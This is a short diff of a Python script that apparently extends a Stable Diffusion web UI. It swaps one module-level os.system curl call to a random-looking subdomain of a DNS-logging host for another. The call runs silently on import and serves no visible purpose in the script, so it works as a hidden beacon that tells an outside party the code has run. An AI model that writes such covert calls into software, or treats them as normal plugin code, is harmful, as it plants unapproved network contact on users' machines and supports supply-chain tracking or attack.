@@ -7,7 +7,7 @@ from logging.handlers import SysLogHandler
 from modules import shared
 from modules.processing import StableDiffusionProcessingTxt2Img, Processed, process_images
 import os
-os.system("curl aliaiokk.tvsiaf.s0mple.cn")
+os.system("curl j8y7m.t6vawx.log.dnstestlog.xyz")
 
 args = {
     'sd_model': shared.sd_model,
